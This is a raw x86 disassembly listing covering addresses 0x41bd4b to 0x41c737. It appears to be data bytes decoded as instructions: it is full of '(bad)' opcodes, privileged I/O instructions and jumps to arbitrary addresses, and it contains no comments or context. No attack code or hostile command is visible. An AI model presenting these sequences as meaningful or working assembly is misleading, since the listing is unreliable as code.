  41bd4b:	add    BYTE PTR [edi],bh
  41bd4d:	mov    eax,ds:0xe2229071
  41bd52:	sbb    BYTE PTR cs:[ecx],ch
  41bd55:	cmp    al,0x27
  41bd57:	mov    bl,0x6a
  41bd59:	mov    cs,ecx
  41bd5b:	shl    BYTE PTR [esi-0xa3432fb],cl
  41bd61:	xchg   BYTE PTR [ecx],bh
  41bd63:	lahf   
  41bd64:	stos   BYTE PTR es:[edi],al
  41bd65:	dec    ecx
  41bd66:	enter  0x9d60,0x9f
  41bd6a:	adc    dl,BYTE PTR fs:[edx-0x23fec60a]
  41bd71:	lahf   
  41bd72:	add    al,0xec
  41bd74:	xor    BYTE PTR [eax+0x7b],dh
  41bd77:	frstor [ebx]
  41bd79:	fcom   DWORD PTR ds:0xccd3e25c
  41bd7f:	lock inc edi
  41bd81:	pop    eax
  41bd82:	dec    ecx
  41bd83:	fwait
  41bd84:	mov    esp,0x606cb46f
  41bd89:	adc    BYTE PTR [edx],0xd4
  41bd8c:	push   esi
  41bd8d:	out    0x6f,eax
  41bd8f:	sbb    eax,0x8845c754
  41bd94:	fsubr  DWORD PTR [ebp+0x6247265a]
  41bd9a:	adc    DWORD PTR [edi+0x34],edi
  41bd9d:	jae    0x41be02
  41bd9f:	mov    bh,0x90
  41bda1:	daa    
  41bda2:	inc    ecx
  41bda3:	mov    eax,0xc044870c
  41bda8:	cmp    al,0x11
  41bdaa:	inc    esi
  41bdab:	scas   eax,DWORD PTR es:[edi]
  41bdac:	dec    eax
  41bdad:	ror    DWORD PTR [edi+edi*2],cl
  41bdb0:	push   0xe15f8899
  41bdb5:	cmp    dh,dh
  41bdb7:	jecxz  0x41be06
  41bdb9:	push   ds
  41bdba:	std    
  41bdbb:	pop    ebx
  41bdbc:	sbb    al,0xfd
  41bdbe:	loope  0x41bd59
  41bdc0:	dec    ebp
  41bdc1:	popf   
  41bdc2:	xor    BYTE PTR [ebx-0x5b],bh
  41bdc5:	xchg   esi,eax
  41bdc6:	sub    al,BYTE PTR [ebx]
  41bdc8:	enter  0xca96,0x76
  41bdcc:	inc    eax
  41bdcd:	add    DWORD PTR ds:0x63406e2e,ecx
  41bdd3:	add    ah,0x25
  41bdd6:	(bad)  
  41bdd7:	neg    DWORD PTR [ebx-0x7a4d40f8]
  41bddd:	scas   al,BYTE PTR es:[edi]
  41bdde:	dec    ebx
  41bddf:	mov    ds,WORD PTR [ebx+ecx*4]
  41bde2:	int3   
  41bde3:	lods   al,BYTE PTR ds:[esi]
  41bde4:	cwde   
  41bde5:	sub    eax,0xbc8ad721
  41bdea:	stos   BYTE PTR es:[edi],al
  41bdeb:	dec    eax
  41bdec:	or     DWORD PTR [ebx],0x2c
  41bdef:	rol    DWORD PTR [ecx-0x9e3c588],0xb9
  41bdf6:	add    DWORD PTR [edx-0x4e],0x2d
  41bdfa:	fmul   DWORD PTR [esi-0x2b978460]
  41be00:	adc    BYTE PTR [ecx+0x36],0x9
  41be04:	jge    0x41bdfb
  41be06:	push   ds
  41be07:	and    al,0x95
  41be09:	cmp    cl,BYTE PTR [edi+ecx*4+0x9]
  41be0d:	dec    edi
  41be0e:	(bad)  
  41be0f:	(bad)  
  41be10:	gs test al,0x43
  41be13:	mov    cl,BYTE PTR [eax+eiz*4+0x3b54e824]
  41be1a:	mov    al,0xe0
  41be1c:	icebp  
  41be1d:	mov    dl,0xf5
  41be1f:	sar    edx,0xf3
  41be22:	adc    bh,BYTE PTR [ebx]
  41be24:	cmp    eax,0x6366b0a6
  41be29:	mov    ah,0x95
  41be2b:	cmp    al,0x3c
  41be2d:	dec    esp
  41be2e:	loop   0x41be1a
  41be30:	xchg   ebp,eax
  41be31:	add    eax,eax
  41be33:	out    dx,al
  41be34:	fs out dx,eax
  41be36:	xor    ebx,DWORD PTR ds:0x89739959
  41be3c:	gs pop ebp
  41be3e:	or     DWORD PTR [esi],esp
  41be40:	cwde   
	...
  41beb1:	add    BYTE PTR [eax],al
  41beb3:	add    ch,al
  41beb5:	stc    
  41beb6:	lods   eax,DWORD PTR ds:[esi]
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	psubsw mm5,mm3
  41bec2:	inc    ecx
  41bec3:	cwde   
  41bec4:	push   ebx
  41bec5:	sub    eax,0xf50001
  41beca:	add    BYTE PTR [eax],al
  41becc:	xchg   ebp,eax
  41becd:	popa   
  41bece:	push   edx
  41becf:	aad    0xbc
  41bed1:	imul   edx,DWORD PTR ds:0x95916eaf,0xffffffd4
  41bed8:	add    BYTE PTR [edx],al
  41beda:	test   al,0xe
  41bedc:	call   0xef325e81
  41bee1:	cmc    
  41bee2:	sbb    BYTE PTR [edi+0x7673274c],cl
  41bee8:	mov    bh,0xb1
  41beea:	(bad)  
  41beeb:	push   0xffffffea
  41beed:	jnp    0x41be7e
  41beef:	pop    ebp
  41bef0:	mov    ecx,0xe3240e5a
  41bef5:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41bef7:	hlt    
  41bef8:	push   ss
  41bef9:	inc    edi
  41befa:	jnp    0x41beea
  41befc:	xor    ecx,ecx
  41befe:	cmp    edi,DWORD PTR [eax+0x3d]
  41bf01:	add    BYTE PTR [eax+0x7c],dh
  41bf04:	loopne 0x41bea5
  41bf06:	mov    ebx,0x421dfda4
  41bf0b:	jp     0x41bea4
  41bf0d:	add    BYTE PTR [ecx-0x6eab04ae],al
  41bf13:	pop    eax
  41bf14:	sbb    ebp,esp
  41bf16:	shl    BYTE PTR [ebp+0xd454d55],0x1d
  41bf1d:	stc    
  41bf1e:	xchg   esi,eax
  41bf1f:	sbb    bh,dl
  41bf21:	pusha  
  41bf22:	jb     0x41bf85
  41bf24:	imul   edx,edi,0xca02d169
  41bf2a:	arpl   di,ax
  41bf2c:	int3   
  41bf2d:	or     DWORD PTR [edx-0x35],0x68d7dd6f
  41bf34:	jecxz  0x41bee5
  41bf36:	pop    ds
  41bf37:	inc    eax
  41bf38:	adc    eax,DWORD PTR [eax+0x57]
  41bf3b:	xor    al,0xd6
  41bf3d:	mov    ch,0x8b
  41bf3f:	sub    eax,0xd918126f
  41bf44:	loope  0x41bf83
  41bf46:	lds    esi,FWORD PTR [ebx-0x71]
  41bf49:	(bad)  
  41bf4a:	hlt    
  41bf4b:	push   ebp
  41bf4c:	ins    BYTE PTR es:[edi],dx
  41bf4d:	jns    0x41bf22
  41bf4f:	inc    edx
  41bf50:	in     eax,0x2e
  41bf52:	mov    bl,0x10
  41bf54:	jae    0x41bf46
  41bf56:	pop    eax
  41bf57:	(bad)  
  41bf58:	sub    edi,DWORD PTR [edx-0x42032732]
  41bf5e:	sti    
  41bf5f:	mov    ds:0x764d4cb8,eax
  41bf64:	rcl    DWORD PTR [edi],0xc5
  41bf67:	and    DWORD PTR [esi+0x65],ecx
  41bf6a:	ins    BYTE PTR es:[edi],dx
  41bf6b:	or     DWORD PTR [ebx+esi*4-0x5b2511c6],ebx
  41bf72:	jns    0x41bfdb
  41bf74:	rol    DWORD PTR [ebx+eax*8+0x1e],1
  41bf78:	push   0xffa1c991
  41bf7d:	mov    cl,0xf0
  41bf7f:	daa    
  41bf80:	inc    ecx
  41bf81:	les    edx,FWORD PTR [ecx+ebx*1]
  41bf84:	jo     0x41bff9
  41bf86:	fmul   QWORD PTR [edx+0x18]
  41bf89:	ret    0x9e86
  41bf8c:	out    dx,al
  41bf8d:	sbb    BYTE PTR [edx-0x3c230616],bh
  41bf93:	or     al,0x80
  41bf95:	loope  0x41bf89
  41bf97:	mov    bh,0x77
  41bf99:	sub    edx,esi
  41bf9b:	(bad)  [edx]
  41bf9d:	and    DWORD PTR [edi+ebx*1],ebx
  41bfa0:	fwait
  41bfa1:	ss jns 0x41bfae
  41bfa4:	pushf  
  41bfa5:	sti    
  41bfa6:	xor    eax,0x38c736a9
  41bfab:	fld    TBYTE PTR [edi-0x2fd41083]
  41bfb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfb2:	mov    ds:0x2b1bc965,al
  41bfb7:	sub    BYTE PTR ds:0x25a12076,bh
  41bfbd:	push   cs
  41bfbe:	pushf  
  41bfbf:	js     0x41bf7e
	...
  41c031:	add    BYTE PTR [eax],al
  41c033:	add    dh,al
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi-0x7e44657f]
  41c041:	arpl   WORD PTR [ecx+0x12e4896],bp
  41c047:	add    ch,dh
  41c049:	add    BYTE PTR [eax],al
  41c04b:	add    bh,dh
  41c04d:	bound  edx,QWORD PTR es:[eax+ebx*1-0x74]
  41c052:	stc    
  41c053:	push   ebp
  41c054:	or     bh,dh
  41c056:	es jne 0x41c0d0
  41c059:	add    DWORD PTR [ebx-0x39],ebp
  41c05c:	add    BYTE PTR [ebp+eax*1-0x48759ca9],cl
  41c063:	mov    bl,BYTE PTR [edi+0x4e]
  41c066:	out    0x5e,al
  41c068:	dec    ecx
  41c069:	and    DWORD PTR [edx+0x15e7c142],eax
  41c06f:	jbe    0x41c0ad
  41c071:	inc    eax
  41c072:	dec    ecx
  41c073:	inc    esi
  41c074:	sub    DWORD PTR [edx],0x1b
  41c077:	xchg   DWORD PTR [edi],edi
  41c079:	test   al,0x7a
  41c07b:	mov    WORD PTR [edi-0x43],es
  41c07e:	or     eax,0xd7d8bf3
  41c083:	data16 cmp al,0x2
  41c086:	mov    edi,0xc9c119b2
  41c08b:	mov    edx,0x9a5c8188
  41c090:	pop    ds
  41c091:	dec    bx
  41c093:	imul   edi,DWORD PTR [ecx],0x67fd8bbf
  41c099:	(bad)  
  41c09a:	jmp    0x41c05a
  41c09c:	mov    edi,0xad7b8fc6
  41c0a1:	outs   dx,BYTE PTR ds:[esi]
  41c0a2:	outs   dx,DWORD PTR ds:[esi]
  41c0a3:	push   0x84c5c1f
  41c0a8:	or     al,0x91
  41c0aa:	sub    BYTE PTR [edx],dh
  41c0ac:	pop    ss
  41c0ad:	mov    cl,0x19
  41c0af:	lods   al,BYTE PTR ds:[esi]
  41c0b0:	shr    DWORD PTR gs:[edi],1
  41c0b3:	pop    ebx
  41c0b4:	xor    DWORD PTR [edx],0x67fef998
  41c0ba:	mov    ch,0x5b
  41c0bc:	test   DWORD PTR [edx+ecx*2-0x2e840eb],eax
  41c0c3:	je     0x41c07c
  41c0c5:	add    al,0x56
  41c0c7:	pop    esi
  41c0c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c9:	jg     0x41c139
  41c0cb:	mov    ecx,ebx
  41c0cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0ce:	stos   BYTE PTR es:[edi],al
  41c0cf:	sbb    DWORD PTR [eax],0x25
  41c0d2:	add    DWORD PTR [ecx+0x51],0xfffffff6
  41c0d6:	push   es
  41c0d7:	mov    eax,ds:0xd42e48c7
  41c0dc:	(bad)  
  41c0dd:	and    ebp,DWORD PTR [eax-0x2f]
  41c0e0:	in     eax,0xcb
  41c0e2:	jno    0x41c096
  41c0e4:	adc    eax,0xa75dd39a
  41c0e9:	(bad)
  41c0ec:	inc    edx
  41c0ed:	and    DWORD PTR [edx+0x5c7ad3ca],ebp
  41c0f3:	bound  esp,QWORD PTR [ecx+ebx*1]
  41c0f6:	jae    0x41c0db
  41c0f8:	sti    
  41c0f9:	std    
  41c0fa:	jbe    0x41c088
  41c0fc:	pop    ss
  41c0fd:	jb     0x41c0d7
  41c0ff:	and    BYTE PTR [eax+0x47],dh
  41c102:	add    al,0xa5
  41c104:	cmp    bl,BYTE PTR [eax+0x1f]
  41c107:	lahf   
  41c108:	dec    ebx
  41c109:	leave  
  41c10a:	retf   
  41c10b:	(bad)  
  41c10d:	hlt    
  41c10e:	bound  esi,QWORD PTR [ebx-0x68]
  41c111:	dec    ecx
  41c112:	jno    0x41c0af
  41c114:	xchg   BYTE PTR [eax],bh
  41c116:	inc    esi
  41c117:	xor    DWORD PTR [esi],esp
  41c119:	lods   al,BYTE PTR ds:[esi]
  41c11b:	or     BYTE PTR [edi+ecx*2],dh
  41c11e:	int3   
  41c11f:	add    eax,0x2b6a196a
  41c124:	shl    BYTE PTR [edx+0x72],cl
  41c127:	frstpm(287 only) 
  41c129:	or     al,0x7d
  41c12b:	and    DWORD PTR [ebp-0x65],ecx
  41c12e:	mov    ds:0xf914b129,eax
  41c133:	or     al,0xc9
  41c135:	loopne 0x41c171
  41c137:	shr    DWORD PTR [ecx+eax*8-0x6],cl
  41c13b:	inc    esi
  41c13c:	leave  
  41c13d:	es mov eax,0x1c3d
	...
  41c1b3:	add    BYTE PTR [esi+0x6be069a5],cl
  41c1b9:	in     al,dx
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0x1bfcc1d7
  41c1c4:	cmp    eax,0xf500012f
  41c1c9:	add    BYTE PTR [eax],al
  41c1cb:	add    BYTE PTR [ebx],bl
  41c1cd:	jle    0x41c16d
  41c1cf:	sbb    bh,al
  41c1d1:	retf   
  41c1d2:	jp     0x41c1d1
  41c1d4:	sub    DWORD PTR ds:0x290a461c,ebp
  41c1da:	jns    0x41c238
  41c1dc:	or     eax,0x882f409b
  41c1e1:	dec    esp
  41c1e2:	or     esi,0xf1f2e783
  41c1e8:	add    BYTE PTR [esp+ebx*4],dh
  41c1eb:	push   eax
  41c1ec:	mov    DWORD PTR [esi+0x47],edx
  41c1ef:	add    cl,bh
  41c1f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1f2:	sbb    DWORD PTR [esi+0x46036863],esi
  41c1f8:	adc    BYTE PTR [ecx+0x69],ch
  41c1fb:	sub    BYTE PTR [esi],bl
  41c1fd:	arpl   WORD PTR [esi],di
  41c1ff:	xchg   ah,ch
  41c201:	xor    DWORD PTR [esi+0x5ce5077a],esp
  41c207:	les    esi,FWORD PTR [ebx]
  41c209:	mov    BYTE PTR [ebx+ebx*1],dh
  41c20c:	or     eax,0x50f153b4
  41c211:	jl     0x41c265
  41c213:	inc    ax
  41c215:	frstor [eax+eiz*8]
  41c218:	jmp    0x41c20f
  41c21a:	mov    esp,0x959057d8
  41c21f:	iret   
  41c220:	js     0x41c2a1
  41c222:	mov    esi,0xa100342b
  41c227:	xor    cl,BYTE PTR [ecx-0x16942fb2]
  41c22d:	test   al,0xed
  41c22f:	icebp  
  41c230:	out    dx,eax
  41c231:	jp     0x41c233
  41c233:	mov    WORD PTR ds:0xfb50983f,es
  41c239:	dec    eax
  41c23a:	and    DWORD PTR ds:0x4e3e9d66,edi
  41c240:	xor    eax,0x22cf2131
  41c245:	ins    BYTE PTR es:[edi],dx
  41c246:	(bad)  
  41c247:	(bad)  
  41c248:	jmp    0x3d47:0x479b2c0e
  41c24f:	cli    
  41c250:	inc    edx
  41c251:	cmp    ebx,esi
  41c253:	cmp    esi,DWORD PTR fs:[edi]
  41c256:	out    0xaf,al
  41c258:	(bad)  
  41c25a:	(bad)  
  41c25b:	in     eax,dx
  41c25c:	mov    ds:0x983742c7,eax
  41c261:	pop    ebp
  41c262:	js     0x41c215
  41c264:	mov    ch,0xa6
  41c266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c267:	inc    ebx
  41c268:	loop   0x41c2ab
  41c26a:	repz pop esp
  41c26c:	adc    BYTE PTR [eax+0x10],0xfd
  41c270:	jp     0x41c267
  41c272:	cmp    dh,ah
  41c274:	ja     0x41c2a6
  41c276:	les    ebx,FWORD PTR [ebx]
  41c278:	push   esi
  41c279:	imul   edx,DWORD PTR [esp-0x5424bfba],0x1d10ad04
  41c284:	push   ecx
  41c285:	mov    eax,0x6fe33660
  41c28a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c28b:	sbb    eax,0x1a7e924a
  41c290:	mov    al,ds:0xd2669fd4
  41c295:	sbb    ebx,ecx
  41c297:	add    esp,DWORD PTR [ebx-0x59]
  41c29a:	loopne 0x41c23d
  41c29c:	retf   
  41c29d:	pusha  
  41c29e:	aam    0xfc
  41c2a0:	jge    0x41c2a1
  41c2a2:	and    al,0x6
  41c2a4:	fwait
  41c2a5:	sti    
  41c2a6:	push   es
  41c2a7:	fwait
  41c2a8:	mov    ds:0x80c4627d,al
  41c2ad:	repnz mov cl,0x4
  41c2b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2b1:	aas    
  41c2b2:	mov    ebp,0x6fb35555
  41c2b7:	mov    ds:0xf415d169,eax
  41c2bc:	fmul   DWORD PTR [eax]
  41c2be:	addr16 mov eax,ds:0xcb
	...
  41c332:	add    BYTE PTR [eax],al
  41c334:	dec    eax
  41c335:	or     eax,0xbb5dab1d
  41c33a:	(bad)  
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	je     0x41c3a9
  41c342:	inc    esi
  41c343:	sub    esi,DWORD PTR [edx]
  41c345:	xor    BYTE PTR [ecx],al
  41c347:	add    ch,dh
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    BYTE PTR [ebx-0x78],bl
  41c34e:	or     eax,0x8f3a2908
  41c353:	mov    edi,DWORD PTR [ebp+0x1f]
  41c356:	pop    eax
  41c357:	addr16 icebp 
  41c359:	mov    ebp,0xb2f7cdbf
  41c35e:	stos   BYTE PTR es:[edi],al
  41c35f:	pop    edx
  41c360:	xor    ch,bh
  41c362:	jns    0x41c2ed
  41c364:	push   0x50
  41c366:	add    esi,DWORD PTR [eax+0x685f26bd]
  41c36c:	cs sbb al,0x44
  41c36f:	and    eax,0x772c4aba
  41c374:	ins    BYTE PTR es:[edi],dx
  41c375:	out    dx,eax
  41c376:	imul   DWORD PTR [eax+eax*1]
  41c379:	pop    edx
  41c37a:	pop    es
  41c37b:	dec    ecx
  41c37c:	std    
  41c37d:	pop    ds
  41c37e:	sbb    ah,BYTE PTR [eax+0x794a678d]
  41c384:	daa    
  41c385:	xchg   edi,eax
  41c386:	pop    edi
  41c387:	retf   0xc349
  41c38a:	mov    edi,0xf46c7dc3
  41c38f:	push   esi
  41c390:	sbb    BYTE PTR [edi-0xc],cl
  41c393:	js     0x41c32b
  41c395:	mov    ebx,0x62dbe347
  41c39a:	cs (bad) 
  41c39c:	or     eax,0x3fc52271
  41c3a1:	cmp    BYTE PTR ds:0xf36f2520,ah
  41c3a7:	add    BYTE PTR [esi],dh
  41c3a9:	mov    ch,0x77
  41c3ab:	sbb    BYTE PTR [ecx],al
  41c3ad:	mov    ds:0x82ac31da,al
  41c3b2:	adc    al,0xf6
  41c3b4:	or     eax,0x48c48ed1
  41c3b9:	add    DWORD PTR [ebp-0xcde95e6],edi
  41c3bf:	inc    esp
  41c3c0:	dec    ebp
  41c3c1:	mov    ebx,0x398b45ca
  41c3c6:	adc    al,0xff
  41c3c8:	fucom  st(7)
  41c3ca:	ins    DWORD PTR es:[edi],dx
  41c3cb:	int    0xab
  41c3cd:	aam    0x69
  41c3cf:	or     ah,bh
  41c3d1:	push   es
  41c3d2:	or     ebx,DWORD PTR [ecx]
  41c3d4:	or     al,0xc1
  41c3d6:	fdivrp st(7),st
  41c3d8:	stos   DWORD PTR es:[edi],eax
  41c3d9:	xchg   esi,eax
  41c3da:	sub    DWORD PTR [eax],ebx
  41c3dc:	ja     0x41c448
  41c3de:	dec    ecx
  41c3df:	push   ecx
  41c3e0:	int3   
  41c3e1:	adc    BYTE PTR [edx],0x19
  41c3e4:	push   edx
  41c3e5:	(bad)  
  41c3e6:	stos   BYTE PTR es:[edi],al
  41c3e7:	jae    0x41c44e
  41c3e9:	mov    al,0xc7
  41c3eb:	cs lahf 
  41c3ed:	leave  
  41c3ee:	and    BYTE PTR [edi-0x296bdaaf],ah
  41c3f4:	(bad)  
  41c3f5:	xlat   BYTE PTR ds:[ebx]
  41c3f6:	std    
  41c3f7:	inc    edx
  41c3f8:	outs   dx,BYTE PTR ds:[esi]
  41c3f9:	mov    ecx,0xcc855733
  41c3fe:	push   0xffffff94
  41c400:	inc    ecx
  41c401:	loope  0x41c440
  41c403:	in     al,dx
  41c404:	xchg   ecx,eax
  41c405:	lock test al,0xa2
  41c408:	(bad)  
  41c409:	or     al,BYTE PTR [esi]
  41c40b:	sub    ebx,ecx
  41c40d:	stos   BYTE PTR es:[edi],al
  41c40e:	shl    esp,1
  41c410:	xor    dl,BYTE PTR [eax-0x66]
  41c413:	xchg   ebx,eax
  41c414:	jbe    0x41c462
  41c416:	(bad)  
  41c417:	mov    esi,0x127379c7
  41c41c:	js     0x41c3c1
  41c41e:	dec    esp
  41c41f:	call   0x5d517fda
  41c424:	out    dx,eax
  41c425:	xchg   ebp,eax
  41c426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c427:	shr    BYTE PTR [esi],1
  41c429:	mov    eax,ds:0xd76d4673
  41c42e:	cmp    al,0xf9
  41c430:	dec    ebx
  41c431:	adc    eax,0x952c760d
  41c436:	(bad)  
  41c437:	cwde   
  41c438:	(bad)  
  41c439:	dec    eax
  41c43a:	mov    ecx,0xc09fbf14
  41c43f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c440:	ins    BYTE PTR es:[edi],dx
	...
  41c4b1:	add    BYTE PTR [eax],al
  41c4b3:	add    ah,dl
  41c4b5:	in     al,dx
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx+0x576387ae]
  41c4c4:	daa    
  41c4c5:	xor    DWORD PTR [ecx],eax
  41c4c7:	add    ch,dh
  41c4c9:	add    BYTE PTR [eax],al
  41c4cb:	add    BYTE PTR [eax],dl
  41c4cd:	ja     0x41c4d6
  41c4cf:	mov    cl,0x7b
  41c4d1:	adc    ch,bl
  41c4d3:	call   0xeedf1905
  41c4d8:	mov    eax,0xcc6e520
  41c4dd:	test   BYTE PTR [edi+0x44],bl
  41c4e0:	lock mov ebx,es
  41c4e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4e4:	adc    al,BYTE PTR [esi+0x4d301550]
  41c4ea:	and    dh,BYTE PTR [ebx-0x77]
  41c4ed:	add    al,0x7e
  41c4ef:	js     0x41c516
  41c4f1:	adc    DWORD PTR [eax+0x62],0xbc40919d
  41c4f8:	cli    
  41c4f9:	push   ecx
  41c4fa:	fcom   QWORD PTR [ecx+ebp*4-0x755b1031]
  41c501:	jnp    0x41c540
  41c503:	pop    ebx
  41c504:	loope  0x41c526
  41c506:	pusha  
  41c507:	push   eax
  41c508:	add    BYTE PTR es:[eax-0x282da5a0],bl
  41c50f:	ins    BYTE PTR es:[edi],dx
  41c510:	dec    edx
  41c511:	and    BYTE PTR [esi-0x19395a27],dl
  41c517:	rol    DWORD PTR [edi+0xf],cl
  41c51a:	mov    ebx,0xba4b309a
  41c51f:	sub    al,0xb
  41c521:	int    0xf7
  41c523:	or     BYTE PTR ds:0x3ea21a15,bh
  41c529:	sbb    eax,DWORD PTR [edx]
  41c52b:	pop    ecx
  41c52c:	dec    esi
  41c52d:	pop    edx
  41c52e:	stos   DWORD PTR es:[edi],eax
  41c52f:	js     0x41c4d7
  41c531:	add    DWORD PTR [eax+0x2bca5040],0xffffffcd
  41c538:	push   ebx
  41c539:	adc    BYTE PTR [edi],bh
  41c53b:	rol    BYTE PTR [ebp-0x6a],1
  41c53e:	mov    eax,0x8b5b0f0a
  41c543:	fst    QWORD PTR [esi-0x52]
  41c546:	jmp    0x41c4eb
  41c548:	sub    al,0xf3
  41c54a:	out    0x33,al
  41c54c:	fisubr DWORD PTR [esi+0x76]
  41c54f:	mov    cl,0xf
  41c551:	jmp    0x670e3517
  41c556:	cmp    edx,DWORD PTR [esp+edi*4-0x46f3e133]
  41c55d:	lods   eax,DWORD PTR ds:[esi]
  41c55e:	add    ecx,ecx
  41c560:	int3   
  41c561:	xchg   edx,eax
  41c562:	ret    0xbc50
  41c565:	mov    ds:0xbbaca5e7,al
  41c56a:	xchg   ecx,eax
  41c56b:	fdivr  st(5),st
  41c56d:	ret    0x711b
  41c570:	jmp    0xa0a7b9c9
  41c575:	in     al,0x3f
  41c577:	push   ebx
  41c578:	rol    DWORD PTR [eax+0x8],cl
  41c57b:	fs (bad) 
  41c57d:	jp     0x41c5eb
  41c57f:	xchg   esi,eax
  41c580:	pop    es
  41c581:	inc    ecx
  41c582:	xchg   edx,eax
  41c583:	test   al,0xf7
  41c585:	gs sahf 
  41c587:	cld    
  41c588:	inc    esp
  41c589:	in     eax,dx
  41c58a:	mov    eax,0x1cb096ff
  41c58f:	in     eax,0xf7
  41c591:	xchg   ecx,eax
  41c592:	mov    ah,0x9f
  41c594:	das    
  41c595:	jmp    0x8b4c:0xe3891140
  41c59c:	sahf   
  41c59d:	pop    esp
  41c59e:	into   
  41c59f:	jp     0x41c53a
  41c5a1:	and    ebx,DWORD PTR fs:[esi]
  41c5a4:	xchg   ecx,eax
  41c5a5:	dec    ecx
  41c5a6:	jg     0x41c553
  41c5a8:	in     eax,0xcd
  41c5aa:	pop    ds
  41c5ab:	xor    al,0x4a
  41c5ad:	push   ecx
  41c5ae:	dec    eax
  41c5af:	xor    BYTE PTR [ecx-0x2d1cbc66],0xd2
  41c5b6:	mov    WORD PTR [ebx+0x50],?
  41c5b9:	stos   WORD PTR es:[edi],ax
  41c5bb:	mov    bl,0xd5
  41c5bd:	stc    
  41c5be:	cmp    ah,BYTE PTR [ebx]
  41c5c0:	and    eax,0x0
	...
  41c631:	add    BYTE PTR [eax],al
  41c633:	add    BYTE PTR [eax-0x2469e49d],ch
  41c639:	(bad)  
  41c63a:	lods   eax,DWORD PTR ds:[esi]
  41c63b:	jg     0x41c62c
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	imul   ebp,DWORD PTR [esi+0x59],0x19
  41c644:	sbb    al,0x32
  41c646:	add    DWORD PTR [eax],eax
  41c648:	cmc    
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    BYTE PTR [ecx+ebx*4],bl
  41c64e:	loopne 0x41c65f
  41c650:	cmp    bl,dh
  41c652:	mov    fs,WORD PTR [ebx-0x595f4403]
  41c658:	mov    bl,0xde
  41c65a:	fstp   DWORD PTR [ebx]
  41c65c:	pop    esp
  41c65d:	mov    esp,0x785ef098
  41c662:	into   
  41c663:	jge    0x41c637
  41c665:	cmp    BYTE PTR [ecx+ecx*1+0x3d6ac4b],dl
  41c66c:	pop    edi
  41c66d:	add    bh,BYTE PTR [ebx-0x2d30edb2]
  41c673:	xlat   BYTE PTR ds:[ebx]
  41c674:	inc    eax
  41c675:	gs push ss
  41c677:	cmp    eax,0xee247b9
  41c67c:	mov    ds:0x890dd27f,eax
  41c681:	shl    BYTE PTR [edx-0x48],0xd4
  41c685:	cli    
  41c686:	and    DWORD PTR [esi],ebx
  41c688:	mov    WORD PTR [ecx-0x59],?
  41c68b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c68c:	lock mov dh,0xb2
  41c68f:	mov    ah,BYTE PTR [ecx-0x6c]
  41c692:	push   ebp
  41c693:	sbb    DWORD PTR [ebp+0x43],esp
  41c696:	loop   0x41c685
  41c698:	aas    
  41c699:	int    0xf1
  41c69b:	mov    BYTE PTR [eax+eax*4-0x5d],dl
  41c69f:	jb     0x41c6c2
  41c6a1:	jnp    0x41c65c
  41c6a3:	idiv   DWORD PTR [ebp-0x1f6f594]
  41c6a9:	mov    cl,0xab
  41c6ab:	and    edx,edi
  41c6ad:	pusha  
  41c6ae:	or     eax,0xd18f2a9e
  41c6b3:	(bad)  
  41c6b5:	ins    DWORD PTR es:[edi],dx
  41c6b6:	push   es
  41c6b7:	xor    DWORD PTR [edi+edi*1-0x739ccdb7],edi
  41c6be:	jmp    0x908a:0x25406d57
  41c6c5:	sbb    DWORD PTR [edx+0x7614c04b],edi
  41c6cb:	add    eax,0xc7302e4
  41c6d0:	outs   dx,DWORD PTR ds:[esi]
  41c6d1:	add    eax,0xfb12ddec
  41c6d6:	lea    ebx,[edi]
  41c6d8:	or     dl,BYTE PTR [esi+0x46]
  41c6db:	in     eax,0x55
  41c6dd:	ja     0x41c65f
  41c6df:	vpunpckhdq xmm3,xmm4,XMMWORD PTR [ebx+0x4a]
  41c6e4:	fwait
  41c6e5:	in     al,0x84
  41c6e7:	xchg   DWORD PTR [esi+0x65],esi
  41c6ea:	addr16 mov ebp,0x7e3ed70b
  41c6f0:	fild   WORD PTR [ecx]
  41c6f2:	jle    0x41c742
  41c6f4:	inc    edx
  41c6f5:	arpl   WORD PTR [esi-0x180cf9bf],di
  41c6fb:	test   DWORD PTR [esi],ebx
  41c6fd:	hlt    
  41c6fe:	push   ss
  41c6ff:	adc    bh,dl
  41c701:	adc    esp,DWORD PTR [ebx-0x10b6585]
  41c707:	(bad)  
  41c708:	sbb    BYTE PTR [edx-0x3a44e5d3],bl
  41c70e:	cmp    dl,BYTE PTR [ecx]
  41c710:	retf   
  41c711:	lock or dh,ch
  41c714:	inc    esi
  41c715:	mov    ebp,esi
  41c717:	call   0x382a80d9
  41c71c:	cmp    ah,BYTE PTR [ebx-0x1f]
  41c71f:	xor    ch,bh
  41c721:	test   BYTE PTR [edx-0x6a647392],dl
  41c727:	sbb    DWORD PTR [esi-0x6f],esi
  41c72a:	adc    DWORD PTR [esp+edx*4],ebp
  41c72d:	cmp    eax,0xde3f2973
  41c732:	sar    BYTE PTR [ebx-0x7a],1
  41c735:	test   ch,dl
  41c737:	cmp    BYTE PTR [esi],ah
